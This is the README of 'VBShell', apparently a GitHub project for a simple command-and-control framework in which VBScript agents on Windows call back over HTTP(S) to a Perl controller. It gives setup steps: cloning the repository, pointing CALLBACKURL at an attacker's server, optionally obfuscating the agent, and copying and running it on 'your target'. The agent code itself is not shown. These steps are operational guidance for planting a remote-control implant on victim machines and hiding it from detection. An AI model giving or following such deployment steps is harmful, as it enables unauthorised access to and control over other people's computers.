# VBShell

> A simple C2 written with VBScript agents

This is a toy C2 program with VBScript agents that run natively (i.e no additional installation is necessary) on windows and communicate via HTTP(S) to a Perl-based controller.

## Installation

1. Clone the repository and install the server dependencies (linux-only)

```bash
git clone https://github.com/lvmalware/vbshell
cd vbshell
cpanm --installdeps .
```

2. Edit the vbshell.vbs file and change the value of CALLBACKURL to your C2 server's url

```vbscript
CALLBACKURL = "https://my.server.tld"
```
3. Obfuscate the script somehow (optional)

4. Copy the vbshell.vbs file to your target and run it

5. Have fun
